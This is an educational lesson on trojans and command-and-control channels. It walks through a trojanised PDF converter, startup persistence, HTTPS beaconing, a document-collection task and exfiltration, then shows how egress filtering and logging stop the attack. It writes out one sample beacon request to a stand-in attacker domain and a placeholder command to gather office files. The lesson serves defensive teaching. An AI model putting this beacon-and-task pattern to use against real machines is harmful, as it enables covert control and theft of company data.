# Trojans and command-and-control channels

`lesson` H3 · `section` H · `wave` 3 · `format` 1

## Passport

- `attack` T1204.002, T1071.001, T1041
- `severity` high
- `impact` The attacker controls an employee's computer and carries off company documents
- `defence` Outbound traffic only through a gateway with an allowlist
- `class` Trojan with a command and control channel

## Sources

- [MITRE ATT&CK TA0011: Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [MITRE ATT&CK T1071.001: Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
- [MITRE ATT&CK T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)
- [MITRE ATT&CK T1204.002: User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
- [MITRE ATT&CK M1037: Filter Network Traffic](https://attack.mitre.org/mitigations/M1037/)
- [MITRE ATT&CK M1031: Network Intrusion Prevention](https://attack.mitre.org/mitigations/M1031/)

## Participants

- `log` **Log** — alerts · `term:logging`
- `pc` **Computer** — 192.0.2.24 · `icon:workstation` · `term:trojan`
- `gw` **Gateway** — filter · `icon:router` · `term:egress-filtering`
- `c2` **Hacker's server** — C2 · `icon:attacker` · `term:c2`

## Zones

- `office` Office network: `log`, `pc`, `gw`
- `evil` Internet: `c2` · `danger`

## Steps

### `trojan` A free program

`c2 → pc` · `attack`
Message: PDF converter · Result: installed along with a trojan

```text
pdf-converter-free.exe
  visible:  PDF converter
  hidden:   ⟦module that talks to the server⟧
```

#### Simple

An employee needs to turn a document into a PDF. They find a free program online, download it
and run it. The program works. But a **trojan** is hidden inside.

#### Step by step

The employee runs the file themselves, so no break-in is needed. The visible part does what it
promised, and the hidden part quietly installs itself alongside.

#### Deeper

The trojan is named after the Trojan horse: a welcome gift with something hidden inside. A user
running a malicious file by hand is MITRE ATT&CK sub-technique T1204.002 "Malicious File".

### `persist` Staying put

`pc → pc` · `attack`
Message: added itself to startup · Result: runs at every sign-in

#### Simple

The trojan **adds itself to startup**. Now it starts every time the employee turns on the
computer, even if the converter is uninstalled.

#### Step by step

The trojan copies itself into an inconspicuous folder and adds an entry that starts it when the
user signs in.

#### Deeper

So far the trojan does nothing on its own: it just waits for instructions. Everything it does
next will arrive over the command and control channel.

### `beacon` "Any tasks?"

`pc → c2` · `attack` · `without-defence`
Message: HTTPS: "any tasks?" · Result: the gateway let it out

```http
GET https://updates-cdn.example/api/check?id=⟦7f3a⟧
```

#### Simple

Once a minute the trojan **calls out on its own**: "any tasks for me?" Nobody outside can connect
in to the computer, but the gateway lets anything from inside go out.

#### Step by step

The request goes over HTTPS to an address that looks like an update server. To the gateway it is
one more encrypted connection among thousands of ordinary ones.

#### Deeper

The link between a captured computer and the attacker is the command and control channel, MITRE
ATT&CK tactic TA0011 "Command and Control". Using ordinary web protocols for it is sub-technique
T1071.001: commands hide in ordinary web traffic and blend in with it. Regular check-ins like
this are called beacons.

### `task` A command

`c2 → pc` · `attack` · `without-defence`
Message: "collect the documents" · Result: command received

```text
server reply:  ⟦collect *.docx and *.xlsx from the Documents folder⟧
```

#### Simple

The attacker's server replies: **"collect the documents"**. The trojan carries out the command,
and the employee keeps working without seeing anything.

#### Step by step

The command comes back in the reply to the same request. The attacker can send any command:
download a new program, take a screenshot, look for passwords.

#### Deeper

The attacker does not need to stay connected: they just leave tasks on their server, and the
trojan picks them up on its next call.

### `exfil` The documents leave

`pc → c2` · `attack` · `without-defence`
Message: archive via POST · Result: the attacker has the documents

#### Simple

The trojan packs up the documents and **sends them** to the same server, the same way. Again the
gateway notices nothing.

#### Step by step

The archive goes out in the body of an HTTPS request. From outside it looks like one more file
upload.

#### Deeper

Carrying data out over the command and control channel that is already open is technique T1041
"Exfiltration Over C2 Channel". The attacker needs no separate channel, and no new suspicious
connection appears.

### `blocked` The gateway says no

`pc → gw` · `attack` · `with-defence` · `stopped`
Message: HTTPS to updates-cdn.example · Result: not on the allowlist, blocked

```text
gateway:  computer 192.0.2.24 → ⟦updates-cdn.example⟧
          unknown domain, not on the allowlist → denied
```

#### Simple

Now office computers reach the internet **only through the gateway**, and it lets them go only
where it is allowed. The trojan's domain is not on the list. The call does not get through, and
no commands arrive. The attack stops here.

#### Step by step

The gateway checks where each connection is going. Work sites and services are known; an
unfamiliar domain is denied. The trojan is still on the computer, but without a connection it is
useless.

#### Deeper

MITRE ATT&CK advises restricting and monitoring outbound web traffic from critical servers so it
goes only to approved destinations (mitigation M1037 "Filter Network Traffic"); the same idea
works for office computers through a gateway. It also advises running intrusion detection and
prevention systems with signatures for malware (M1031). A strict allowlist suits servers best,
since they barely need to go anywhere.

### `alert` An alert

`gw → log` · `safe` · `with-defence`
Message: an attempt every minute · Result: computer cut off the network

#### Simple

The gateway records every attempt in the **log**. One computer knocking on the same unfamiliar
address once a minute is an alert. The computer is taken off the network and examined.

#### Step by step

The security team sees in the log which computer called where. Following that trail, they find
and remove the trojan.

#### Deeper

Regularity gives beacons away: people do not open the same address exactly once a minute around
the clock. Among its detection signs, MITRE ATT&CK lists beacon-like requests and many POST
requests to rare domains.

## How to defend

- **Programs only from trusted sources.** Staff install programs from the company catalogue, not
  from whatever site turns up first.
- **Internet access through a gateway.** Computers, and servers above all, do not go out
  directly. Outbound connections are allowed only where work needs them.
- **Intrusion detection.** A system on the gateway knows the signatures of known malware and
  stops its traffic.
- **Logs and monitoring.** Record which computers go where, and look for regular calls to
  unfamiliar domains.
- **Protection on the computer.** Antivirus and endpoint detection notice a new startup entry and
  an unknown program reaching out to the network.
